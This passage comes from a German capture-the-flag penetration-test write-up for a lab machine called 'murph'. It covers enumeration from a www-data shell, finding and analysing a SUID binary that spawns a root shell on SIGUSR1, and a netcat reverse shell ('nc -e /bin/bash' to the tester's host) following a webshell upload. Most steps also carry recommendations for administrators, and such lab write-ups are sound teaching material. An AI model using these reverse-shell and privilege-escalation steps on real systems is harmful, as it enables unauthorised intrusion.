+<span class="command">-rw-r--r-- 1 pat  pat   807 May 31  2022 .profile</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Von der <code>www-data</code> Shell aus untersuche ich nun die Home-Verzeichnisse anderer Benutzer. Ich liste zuerst die Inhalte von <code>/home/</code> auf (<code>ls /home/</code>), was die Benutzer <code>jen</code> und <code>pat</code> zeigt. Dann wechsle ich in das Home-Verzeichnis von <code>jen</code> (<code>cd /home/jen/</code>) und liste den Inhalt auf (<code>ls -la</code>). Das Verzeichnis enthält Standard-Konfigurationsdateien und eine Datei namens <code>user.txt</code> (19 Bytes groß, deutet auf User Flag hin) mit Berechtigungen <code>-rw-------</code> (nur Eigentümer lesbar/schreibbar). Ich versuche, <code>user.txt</code> zu lesen (<code>cat user.txt</code>), erhalte aber <code>Permission denied</code>, da ich nur als <code>www-data</code> unterwegs bin. Danach wechsle ich in das Home-Verzeichnis von <code>pat</code> (<code>cd ../pat/</code>) und liste dessen Inhalt auf (<code>ls -la</code>). Dieses Verzeichnis enthält Standard-Konfigurationsdateien und eine Datei <code>.gnome-keyring</code>, aber keine offensichtliche Flag-Datei. Für Laien: Ich schaue mir die 'Zuhause'-Ordner der anderen Benutzer (jen und pat) auf dem Computer an. Im Ordner von 'jen' finde ich eine Datei, die wie eine 'Benutzer-Geheimnummer' aussieht (user.txt), aber ich darf sie nicht lesen. Im Ordner von 'pat' finde ich nichts sofort Verdächtiges. Für Experten: Die Enumeration von Benutzer-Home-Verzeichnissen ist Standard, um Flags, Anmeldedaten in Konfigurationsdateien (.ssh, .config etc.) oder andere sensible Daten zu finden. Die Berechtigungen von <code>user.txt</code> (nur Eigentümer lesbar/schreibbar) bedeuten, dass ich höhere Berechtigungen benötige, um sie zu lesen. Das Fehlen einer sofort offensichtlichen Flag oder sensiblen Datei in pats Home-Verzeichnis lenkt den Fokus auf andere PE-Vektoren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Benutzer <code>jen</code> und <code>pat</code> sind identifiziert. Die User Flag ist wahrscheinlich in <code>/home/jen/user.txt</code>, aber ich kann sie mit meinen aktuellen <code>www-data</code> Berechtigungen nicht lesen. Die Home-Verzeichnisse liefern derzeit keine direkten Anmeldedaten für andere Benutzer. Ich muss meine Berechtigungen erhöhen, um auf jens <code>user.txt</code> zuzugreifen und weiter nach PE-Vektoren zu suchen, die mich zu <code>jen</code>, <code>pat</code> oder direkt zu <code>root</code> bringen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nun nach SUID/SGID-Binaries, die potenziell missbraucht werden können, um die Berechtigungen auf dem System zu erhöhen. Dies ist ein gängiger PE-Vektor, wenn <code>sudo</code>-Regeln oder leicht auslesbare Geheimnisse fehlen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer-Home-Verzeichnisse und deren Inhalte nur für den jeweiligen Eigentümer lesbar/schreibbar sind. Implementieren Sie restriktive Dateiberechtigungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@murph:/home/pat$</span> <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+<span class="command">139394 20 -rwsr-sr-x   1 root     www-data    16896 May 31  2022 /opt/murph</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich suche nach SUID-Binaries auf dem System. SUID-Binaries sind ausführbare Dateien, die mit den Berechtigungen des Dateieigentümers (normalerweise root) ausgeführt werden, unabhängig davon, wer sie startet. Dies ist ein häufiger PE-Vektor. Der Befehl <code>find / -type f -perm -4000 -ls 2>/dev/null</code> sucht im gesamten Dateisystem (<code>/</code>) nach Dateien (<code>-type f</code>), die das SUID-Bit gesetzt haben (<code>-perm -4000</code>), listet sie detailliert auf (<code>-ls</code>) und leitet Fehlermeldungen (z.B. wegen fehlender Berechtigungen in bestimmten Verzeichnissen) nach <code>/dev/null</code> um. Die Ausgabe zeigt eine Datei: <code>/opt/murph</code>, die SUID (<code>s</code> im Eigentümer-Berechtigungsfeld <code>rws</code>) und SGID (<code>s</code> im Gruppen-Berechtigungsfeld <code>r-sr</code>) gesetzt hat. Sie gehört <code>root</code> und der Gruppe <code>www-data</code>. Für Laien: Ich suche auf dem ganzen Computer nach speziellen Programmen, die jeder starten kann, die aber mit den Rechten des 'Chefs' (root) oder der Gruppe 'www-data' laufen. Ich finde ein Programm namens <code>/opt/murph</code>, das so eine spezielle Berechtigung hat. Für Experten: Die Identifizierung von SUID/SGID-Binaries ist ein Standard-PE-Schritt. Die Datei <code>/opt/murph</code> mit SUID für Root und SGID für www-data ist ein sehr aussichtsreicher PE-Vektor, insbesondere da der aktuelle Benutzer (www-data) Mitglied der Gruppe ist, für die SGID gesetzt ist. Das SUID-Bit für Root bedeutet, dass das Binary mit Root-Rechten läuft, wenn es ausgeführt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Fund des SUID/SGID-Binaries <code>/opt/murph</code> ist ein signifikanter Durchbruch für die Privilegien-Eskalation. Da das Binary SUID root gehört, wird es bei Ausführung mit Root-Berechtigungen laufen. Die SGID www-data ist für den aktuellen Benutzer (www-data) ebenfalls relevant, aber das SUID root ist der direkte Pfad zu Root-Rechten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Binary <code>/opt/murph</code> genauer, um seine Funktionalität und potenzielle Schwachstellen (z.B. Buffer Overflows, unsichere Systemaufrufe, Pfadmanipulationen) zu identifizieren, die es ermöglichen könnten, Root-Rechte zu erlangen. Verwenden Sie Tools wie <code>file</code>, <code>strings</code>, und statische/dynamische Analysewerkzeuge.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID/SGID-Binaries auf dem System. Überprüfen Sie regelmäßig, welche Binaries diese Berechtigungen haben und ob sie absolut notwendig sind. Entwickeln Sie keine benutzerdefinierten SUID/SGID-Programme, es sei denn, dies ist unvermeidlich und erfolgt nach strengen Sicherheitsrichtlinien. Führen Sie Sicherheitsaudits für SUID-Binaries durch.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@murph:/opt$</span> <span class="command">ls -la /opt/</span>
+<span class="command">total 28</span>
+<span class="command">drwxr-xr-x  2 root root      4096 May 31  2022 .</span>
+<span class="command">drwxr-xr-x 18 root root      4096 May 31  2022 ..</span>
+<span class="command">-rwsr-sr-x  1 root www-data 16896 May 31  2022 murph</span>
+
+<span class="command">www-data@murph:/opt$</span> <span class="command">ls -la /opt/murph</span>
+<span class="command">-rwsr-sr-x 1 root www-data 16896 May 31  2022 /opt/murph</span>
+
+<span class="command">me/pat$</span> <span class="command">file /opt/murph</span>
+<span class="command">/opt/murph: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=656ac7caf8d382453a8cb8aa67ca57b3bc9f5c45, for GNU/Linux 3.2.0, not stripped</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich untersuche die Berechtigungen und Metadaten des Binaries <code>/opt/murph</code> genauer. Ich liste den Inhalt von <code>/opt/</code> auf und dann gezielt die Details von <code>/opt/murph</code> mit <code>ls -la</code>. Die Ausgabe bestätigt die Berechtigungen <code>-rwsr-sr-x</code> und den Besitz von <code>root:www-data</code>. Ich verwende das <code>file</code>-Kommando, um den Dateityp zu identifizieren. Die Ausgabe zeigt, dass <code>/opt/murph</code> ein 64-Bit ELF-Executable ist, das SUID und SGID gesetzt hat (<code>setuid, setgid</code>), dynamisch gelinkt ist und nicht 'stripped' wurde (was bedeutet, dass Symbolinformationen im Binary vorhanden sind, was die Analyse erleichtert). Es ist auch eine 'pie executable' (Position-Independent Executable), was bestimmte Exploits (aber nicht alle) erschweren kann. Für Laien: Ich schaue mir ganz genau an, was für ein 'Programm' das spezielle <code>murph</code>-Programm ist und wer es benutzen darf. Es ist ein normales Programm für Linux-Computer, aber es hat spezielle 'root'-Rechte, wenn es startet. Der 'Ausweis' des Programms sagt, dass es mit 'root'-Berechtigungen läuft. Für Experten: Die detaillierte Analyse von <code>/opt/murph</code> bestätigt die SUID/SGID-Berechtigungen und liefert technische Details (ELF, 64-bit, dynamically linked, not stripped, pie). Das 'not stripped' ist ein Vorteil für die Reverse Engineering-Phase.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die SUID root Berechtigung von <code>/opt/murph</code> ist klar bestätigt. Dies ist unser Hauptziel für die Privilegien-Eskalation. Die technischen Details des Binaries helfen bei der Auswahl der richtigen Analyse- und Exploitation-Methoden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie eine String-Analyse und potenziell Reverse Engineering des Binaries durch, um seine Funktionalität zu verstehen und nach Schwachstellen zu suchen. Achten Sie insbesondere auf Interaktionen mit Signalen oder Systemaufrufe.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Berechtigungen von Binaries in <code>/opt</code> und anderen Systemverzeichnissen. Stellen Sie sicher, dass nur absolut notwendige Binaries SUID/SGID-Berechtigungen haben und dass diese sicher implementiert sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@murph:/opt$</span> <span class="command">strings murph</span>
+<span class="command">/lib64/ld-linux-x86-64.so.2</span>
+<span class="command">setuid</span>
+<span class="command">signal</span>
+<span class="command">puts</span>
+<span class="command">system</span>
+<span class="command">sleep</span>
+<span class="command">__cxa_finalize</span>
+<span class="command">setgid</span>
+<span class="command">__libc_start_main</span>
+<span class="command">libc.so.6</span>
+<span class="command">GLIBC_2.2.5</span>
+<span class="command">_ITM_deregisterTMCloneTable</span>
+<span class="command">__gmon_start__</span>
+<span class="command">_ITM_registerTMCloneTable</span>
+<span class="command">u/UH</span>
+<span class="command">[]A\A]A^A_</span>
+<span class="password">/bin/bash</span>
+<span class="password">Waiting SIGUSR1....</span>
+<span class="command">;*3$"</span>
+<span class="command">GCC: (Debian 10.2.1-6) 10.2.1 20210110</span>
+<span class="command">crtstuff.c</span>
+<span class="command">deregister_tm_clones</span>
+<span class="command">__do_global_dtors_aux</span>
+<span class="command">completed.0</span>
+<span class="command">__do_global_dtors_aux_fini_array_entry</span>
+<span class="command">frame_dummy</span>
+<span class="command">__frame_dummy_init_array_entry</span>
+<span class="command">murph.c</span>
+<span class="command">__FRAME_END__</span>
+<span class="command">__init_array_end</span>
+<span class="command">_DYNAMIC</span>
+<span class="command">__init_array_start</span>
+<span class="command">__GNU_EH_FRAME_HDR</span>
+<span class="command">_GLOBAL_OFFSET_TABLE_</span>
+<span class="command">__libc_csu_fini</span>
+<span class="command">_ITM_deregisterTMCloneTable</span>
+<span class="command">sig_handler</span>
+<span class="command">puts@GLIBC_2.2.5</span>
+<span class="command">_edata</span>
+<span class="command">system@GLIBC_2.2.5</span>
+<span class="command">__libc_start_main@GLIBC_2.2.5</span>
+<span class="command">__data_start</span>
+<span class="command">signal@GLIBC_2.2.5</span>
+<span class="command">__gmon_start__</span>
+<span class="command">__dso_handle</span>
+<span class="command">_IO_stdin_used</span>
+<span class="command">__libc_csu_init</span>
+<span class="command">__bss_start</span>
+<span class="command">main</span>
+<span class="command">setgid@GLIBC_2.2.5</span>
+<span class="command">__TMC_END__</span>
+<span class="command">_ITM_registerTMCloneTable</span>
+<span class="command">setuid@GLIBC_2.2.5</span>
+<span class="command">sleep@GLIBC_2.2.5</span>
+<span class="command">__cxa_finalize@GLIBC_2.2.5</span>
+<span class="command">.symtab</span>
+<span class="command">.strtab</span>
+<span class="command">.shstrtab</span>
+<span class="command">.interp</span>
+<span class="command">.note.gnu.build-id</span>
+<span class="command">.note.ABI-tag</span>
+<span class="command">.gnu.hash</span>
+<span class="command">.dynsym</span>
+<span class="command">.dynstr</span>
+<span class="command">.gnu.version</span>
+<span class="command">.gnu.version_r</span>
+<span class="command">.rela.dyn</span>
+<span class="command">.rela.plt</span>
+<span class="command">.init</span>
+<span class="command">.plt.got</span>
+<span class="command">.text</span>
+<span class="command">.fini</span>
+<span class="command">.rodata</span>
+<span class="command">.eh_frame_hdr</span>
+<span class="command">.eh_frame</span>
+<span class="command">.init_array</span>
+<span class="command">.fini_array</span>
+<span class="command">.dynamic</span>
+<span class="command">.got.plt</span>
+<span class="command">.data</span>
+<span class="command">.bss</span>
+<span class="command">.comment</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende den Befehl <code>strings murph</code>, um alle druckbaren Zeichenketten im Binary <code>/opt/murph</code> zu extrahieren. Dies ist eine schnelle Methode, um Hinweise auf die Funktionalität eines Programms zu erhalten, insbesondere wenn der Quellcode nicht verfügbar ist. Die Ausgabe zeigt mehrere interessante Zeichenketten, darunter Funktionsnamen wie <code>setuid</code>, <code>setgid</code>, <code>signal</code>, <code>system</code>, <code>sleep</code>, und die Zeichenkette <code>/bin/bash</code>. Besonders hervorzuheben ist die Meldung <code>Waiting SIGUSR1....</code>. Für Laien: Ich schaue mir den 'Text' an, der im speziellen 'murph'-Programm versteckt ist. Ich finde dort Wörter, die nach Programm-Funktionen klingen (wie 'system' oder 'sleep'), das Wort 'root'-Programm (<code>/bin/bash</code>) und einen Satz, der sagt: 'Warte auf ein Signal...'. Das deutet darauf hin, dass das Programm etwas tut, wenn es ein bestimmtes Signal bekommt. Für Experten: Die extrahierten Strings bestätigen die Verwendung relevanter Systemaufrufe (<code>setuid</code>, <code>setgid</code>, <code>signal</code>, <code>system</code>) und die Interaktion mit <code>/bin/bash</code>. Die Zeichenkette 'Waiting SIGUSR1....' ist ein starkes Indiz dafür, dass das Binary auf das Signal <code>SIGUSR1</code> wartet (oder darauf reagiert) und möglicherweise nach Erhalt dieses Signals etwas Privilegiertes tut, z.B. eine Root-Shell starten (da <code>/bin/bash</code> und <code>system</code> ebenfalls gefunden wurden und das Binary SUID root hat).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die String-Analyse liefert starke Hinweise darauf, dass <code>/opt/murph</code> auf das <code>SIGUSR1</code>-Signal wartet und möglicherweise bei dessen Empfang eine Root-Shell startet, da es SUID root ist und <code>/bin/bash</code> und <code>system</code> verwendet. Dies ist ein sehr vielversprechender PE-Vektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist, das Binary <code>/opt/murph</code> auszuführen und ihm dann das Signal <code>SIGUSR1</code> zu senden, während es läuft. Wenn die Analyse korrekt ist, sollte dies zu einer Root-Shell führen.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie benutzerdefinierte SUID-Binaries auf unsichere Verhaltensweisen wie das Warten auf Signale zur Ausführung privilegierter Aktionen oder die Verwendung unsicherer Systemaufrufe (wie <code>system()</code> mit Benutzereingaben). Entfernen Sie unnötige SUID-Berechtigungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@murph:/opt$</span> <span class="command">uname -a</span>
+<span class="command">Linux murph 5.10.0-14-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29) x86_64 GNU/Linux</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe den Befehl <code>uname -a</code> aus, um detaillierte Informationen über das Betriebssystem und den Kernel des Zielsystems zu erhalten. Für Laien: Ich frage den Computer nach seiner 'Identitätskarte' – welche Art von System es ist und wie alt die 'Motorteile' (Kernel) sind. Für Experten: Das genaue Betriebssystem (Debian) und die Kernel-Version (5.10.0-14-amd64) sind wichtig für die Recherche nach kernel-spezifischen Exploits oder zur Anpassung anderer Exploits an die Systemumgebung. In diesem Fall bestätigt es die Debian-Basis.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die OS/Kernel-Informationen sind gesammelt. Sie sind nützlich für den Kontext, aber die primäre PE-Strategie konzentriert sich derzeit auf das SUID-Binary <code>/opt/murph</code>.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beachten Sie die OS-Details für zukünftige Schritte oder falls der SUID-Exploit fehlschlägt. Konzentrieren Sie sich nun auf die Ausnutzung von <code>/opt/murph</code>.<br><strong>Empfehlung (Admin):</strong> Halten Sie das Betriebssystem und den Kernel aktuell, um bekannte Schwachstellen zu schließen. Minimieren Sie die Informationen, die über <code>uname -a</code> zugänglich sind, falls dies als sensibles Informationsleck betrachtet wird (in den meisten Umgebungen weniger kritisch).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@murph:/opt$</span> <span class="command">grep sh /etc/passwd</span>
+<span class="password">root:x:0:0:root:/root:/bin/bash</span>
+<span class="password">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span>
+<span class="password">jen:x:1000:1000:jen,,,:/home/jen:/bin/bash</span>
+<span class="password">pat:x:1001:1001:,,,:/home/pat:/bin/bash</span>
+
+<span class="command">www-data@murph:/opt$</span> <span class="command">ls -la /etc/passwd</span>
+<span class="command">-rw-r--r-- 1 root root 1425 May 31  2022 /etc/passwd</span>
+
+<span class="command">www-data@murph:/opt$</span> <span class="command">ls -la /etc/shadow</span>
+<span class="command">-rw-r----- 1 root shadow 969 May 31  2022 /etc/shadow</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich setze meine System-Enumeration als <code>www-data</code> fort. Ich lese erneut die Datei <code>/etc/passwd</code> aus, diesmal gefiltert nach Zeilen, die 'sh' enthalten (<code>grep sh /etc/passwd</code>), um Benutzer mit interaktiven Shells zu identifizieren (root, sshd, jen, pat). Dann prüfe ich die Dateiberechtigungen der Dateien <code>/etc/passwd</code> und <code>/etc/shadow</code> mit <code>ls -la</code>. <code>/etc/passwd</code> hat Berechtigungen <code>-rw-r--r--</code>, ist also für alle lesbar. <code>/etc/shadow</code> hat Berechtigungen <code>-rw-r-----</code> und gehört der Gruppe <code>shadow</code>, ist also nur für Root und Mitglieder der Gruppe shadow lesbar. Für Laien: Ich schaue wieder in die 'Benutzerliste' (<code>/etc/passwd</code>), um zu sehen, wer eine normale Anmeldung hat. Ich prüfe auch, wer die Dateien mit den Benutzerlisten (<code>/etc/passwd</code>) und den geheimen Passwörtern (<code>/etc/shadow</code>) lesen darf. Jeder darf die Benutzerliste lesen, aber nur der Chef (root) und eine spezielle Gruppe (shadow) dürfen die Passwort-Datei lesen. Für Experten: Das Filtern von <code>/etc/passwd</code> ist Standard. Die Berechtigungen von <code>/etc/passwd</code> sind normal. Die Berechtigungen von <code>/etc/shadow</code> sind ebenfalls korrekt konfiguriert, um unberechtigtes Auslesen der Passwort-Hashes zu verhindern. Dies bedeutet, dass ich <code>/etc/shadow</code> nicht direkt als <code>www-data</code> lesen kann.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Benutzer root, jen, und pat haben interaktive Shells. Die Berechtigungen von <code>/etc/shadow</code> sind sicher. Der Benutzername <code>jen</code> und <code>pat</code> sind die primären Ziele für horizontale PE, falls ihre Passwörter gefunden werden oder ich ihre Berechtigungen über SUID-Binaries annehmen kann. Der Fokus bleibt aber auf dem SUID-Binary <code>/opt/murph</code> als direktem Weg zu Root.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Benutzer jen und pat sind weiterhin interessant, aber der wahrscheinlichste PE-Pfad führt über <code>/opt/murph</code> direkt zu Root. Konzentrieren Sie sich auf die Ausnutzung von <code>/opt/murph</code>. Wenn das fehlschlägt, können andere PE-Vektoren oder die Kompromittierung von jen/pat verfolgt werden.<br><strong>Empfehlung (Admin):</strong> Standardberechtigungen für passwd/shadow. Stellen Sie sicher, dass die Mitgliedschaft in der Gruppe <code>shadow</code> stark eingeschränkt ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@murph:/opt$</span> <span class="command">/opt/murph &</span>
+<span class="password">[1] 791</span>
+<span class="command">www-data@murph:/opt$</span> <span class="command">Waiting SIGUSR1....</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe das SUID-Binary <code>/opt/murph</code> aus dem Verzeichnis <code>/opt/</code> mit dem Befehl <code>/opt/murph &</code> aus. Das Ampersand (<code>&</code>) am Ende bewirkt, dass das Programm im Hintergrund gestartet wird, sodass ich die Shell weiterhin nutzen kann. Die Ausgabe <code>[1] 791</code> zeigt, dass das Programm mit der Prozess-ID (PID) 791 im Hintergrund gestartet wurde. Unmittelbar danach gibt die Shell die Meldung <code>Waiting SIGUSR1....</code> aus, was genau der Zeichenkette entspricht, die ich zuvor mit <code>strings</code> gefunden hatte. Dies bestätigt, dass das Programm gestartet wurde und auf das erwartete Signal wartet. Für Laien: Ich starte das spezielle 'root'-Programm (murph) im Hintergrund. Das Programm startet und sagt sofort: 'Ich warte auf ein spezielles Signal!' Für Experten: Das Starten des SUID-Binaries im Hintergrund ist notwendig, um die Kontrolle über die Shell zu behalten und das Signal später senden zu können. Die Ausgabe 'Waiting SIGUSR1....' bestätigt die korrekte Ausführung des Binaries und seine Bereitschaft, auf das <code>SIGUSR1</code>-Signal zu reagieren. Da es SUID root ist, läuft dieser Prozess mit Root-Rechten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das SUID-Binary <code>/opt/murph</code> läuft mit Root-Rechten im Hintergrund und wartet auf das <code>SIGUSR1</code>-Signal. Dies ist die Bestätigung, dass der gefundene PE-Vektor über das Signal korrekt identifiziert wurde. Ich bin nun bereit, das Signal zu senden und Root-Rechte zu erlangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Identifizieren Sie die Prozess-ID (PID) des laufenden <code>murph</code>-Prozesses (in diesem Fall 791, wie durch <code>[1] 791</code> angezeigt) und senden Sie ihm das Signal <code>SIGUSR1</code> (z.B. mit dem Befehl <code>kill -SIGUSR1 791</code>). Dies sollte das Binary veranlassen, seinen privilegierten Code auszuführen und eine Root-Shell zu initiieren.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Ausführung von SUID-Binaries, insbesondere deren Start im Hintergrund oder ungewöhnliches Verhalten wie das Warten auf Signale. Implementieren Sie Systemüberwachung, die Prozesse mit SUID-Berechtigungen alarmiert.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Textabschnitt dient als Anmerkung zur notwendigen Vorgehensweise während des Tests, nämlich der Nutzung mehrerer Terminals (oder Shells), um den SUID-Exploit auszunutzen. Die Schritte zur Ausnutzung des <code>/opt/murph</code>-Binaries, das auf ein Signal wartet, erfordern mindestens zwei separate Shells: eine Shell, von der aus das Binary gestartet wird (und im Hintergrund läuft), und eine zweite Shell, von der aus das Signal an den laufenden Prozess gesendet wird. Zusätzlich wird eine dritte Shell (oder ein Listener auf dem Angreifer-System) für eine potenzielle Reverse Shell benötigt, die das Binary möglicherweise startet. Für Laien: Um das spezielle 'root'-Programm zu aktivieren, brauche ich mehrere 'Befehlsfenster' auf meinem Computer, die alle mit dem Zielcomputer verbunden sind, um gleichzeitig Befehle geben zu können. Für Experten: Die dokumentierte Vorgehensweise unterstreicht die Methodik zur Ausnutzung von Signal-basierten PE-Vektoren, die parallele Interaktion mit dem Zielsystem erfordern. Die Nutzung separater Terminals/Shells ist dafür eine Standardpraxis. Es ist wichtig, die PID des Zielprozesses in einer Shell zu kennen, um von einer anderen Shell aus gezielt ein Signal an diesen Prozess senden zu können.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Anmerkung zur Nutzung mehrerer Terminals ist relevant für die Nachvollziehbarkeit des Exploits. Sie zeigt, dass die Ausnutzung dieses PE-Vektors eine koordinierte Aktion auf dem Zielsystem erfordert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass Sie über die notwendigen Terminal-Sitzungen zum Zielsystem verfügen, um das SUID-Binary auszuführen und das Signal zu senden. Behalten Sie die Prozess-ID (PID) des laufenden Binaries im Auge.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Anzahl der interaktiven Shells, die von Benutzern oder kompromittierten Prozessen auf Systemen geöffnet werden. Ungewöhnlich viele Shells oder Shells, die von unerwarteten Benutzern/Prozessen gestartet werden, können ein Indikator für Kompromittierung sein.</p>
+
+        </section>
+
+          <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Fortsetzung Initial Access -->
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">www-data@murph:~/html/uploads$</span> <span class="command">nc -e /bin/bash 192.168.2.199 4445</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich die RCE-Fähigkeit als Benutzer <code>www-data</code> über die Webshell <code>neu.phtml</code> etabliert hatte, nutze ich nun die Möglichkeit, Systembefehle auszuführen, um eine stabilere Reverse Shell zu meinem Kali-System zu initiieren. Ich verwende den Befehl <code>nc -e /bin/bash 192.168.2.199 4445</code>, um mit Netcat eine Verbindung von der Zielmaschine (murph) zurück zu meinem Kali-System (<code>192.168.2.199</code>) auf Port 4445 aufzubauen. Der Parameter <code>-e /bin/bash</code> weist Netcat an, nach erfolgreichem Verbindungsaufbau die Bash-Shell (<code>/bin/bash</code>) auszuführen und ihre Ein-/Ausgabe über die Netzwerkverbindung umzuleiten. Für Laien: Ich sage dem Computer, er soll eine direkte 'Telefonverbindung' zu meinem Computer aufbauen und mir dann das 'Befehlsfenster' (Shell) über diese Verbindung schicken. Für Experten: Dies ist eine einfache Netcat-Reverse-Shell, die oft genutzt wird, um nach einer RCE-Schwachstelle eine interaktive Shell zu erhalten. Sie ist stabiler und komfortabler als die direkte Befehlsausführung über die Webshell oder eine Debugger-Konsole. Die Ausführung erfolgt im Kontext des aktuellen Benutzers, <code>www-data</code>.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl zur Initiierung der Reverse Shell ist korrekt. Seine Ausführung sollte mir eine stabilere Shell als Benutzer <code>www-data</code> verschaffen. Die Verwendung von <code>nc -e</code> ist eine gängige Methode, vorausgesetzt, Netcat ist auf dem Zielsystem installiert (was meine vorherige Enumeration implizierte oder ich durch Ausprobieren bestätigt habe).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass ein Netcat-Listener auf Port 4445 auf Ihrem Kali-System läuft, bevor Sie diesen Befehl ausführen. Warten Sie dann auf die eingehende Verbindung.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Netzwerkverbindungen von Webservern, insbesondere von Prozessen, die unter Low-Privilege-Benutzern laufen, auf ungewöhnliche Ziel-IPs oder Ports. Implementieren Sie Egress-Filterung auf Firewalls.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">stty raw -echo;fg</span></span>
+<span class="command">[1]  + continued  nc -lvnp 5555</span>
+<span class="command">...</span>
+<span class="password">www-data@murph:~/html/uploads$</span> <span class="command">id</span>
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+<span class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">stty raw -echo;fg</span></span>
+<span class="command">[1]  + continued  nc -lvnp 4445</span>
+
+<span class="password">www-data@murph:/opt$</span> <span class="command">id</span>
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="command">www-data@murph:/opt$</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Block zeigt die Interaktion auf meinem Kali-System nach dem Initiieren der Reverse Shells. Die Befehle <code>stty raw -echo; fg</code> werden auf meinem Kali-Terminal ausgeführt, *nicht* auf der Zielmaschine. <code>stty raw -echo</code> konfiguriert das Terminal so, dass die Eingaben direkt und ohne Echo an die Shell gesendet werden, was eine interaktivere Sitzung ermöglicht. <code>fg</code> (foreground) bringt einen Prozess, der im Hintergrund läuft (hier mein Netcat-Listener, der eine Verbindung empfangen hat), in den Vordergrund des Terminals. Die Ausgaben zeigen, dass ich zuerst versucht habe, eine Shell von einem Listener auf Port 5555 zu 'fangen' und darin den <code>id</code>-Befehl auszuführen (<code>uid=33(www-data)...</code>). Danach habe ich dasselbe für den Listener auf Port 4445 getan, der die Shell von der zuvor gestarteten Netcat-Reverse-Shell empfangen hat. Der Prompt ändert sich zu <code>www-data@murph:...$</code>, und der <code>id</code>-Befehl bestätigt erneut meine Berechtigungen als <code>uid=33(www-data)</code>. Für Laien: Auf meinem Computer 'fange' ich die Verbindung vom Zielcomputer ab und richte mein 'Befehlsfenster' so ein, dass ich normal tippen kann. Ich prüfe dann sofort, wer ich auf dem Zielcomputer bin ('www-data'). Für Experten: Das Einrichten der TTY-Eigenschaften mit <code>stty</code> ist oft notwendig, um eine voll funktionsfähige interaktive Shell über Netcat zu erhalten (obwohl dies bei einfachen <code>nc -e</code> Shells nicht immer perfekt funktioniert). Die erfolgreiche Ausführung von <code>id</code> im erhaltenen Shell-Kontext bestätigt die stabilen Reverse Shells als Benutzer <code>www-data</code> von beiden Listenern (obwohl der auf 4445 der logische nächste Schritt nach der RCE war).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ich habe erfolgreich eine stabile, interaktive Reverse Shell als Benutzer <code>www-data</code> erhalten, indem ich einen Listener auf meinem Kali-System verwendet und die Verbindung vom Zielsystem initiiert habe. Ich bin nun bereit, die Privilegien-Eskalationsphase von dieser Shell aus zu beginnen.</p>
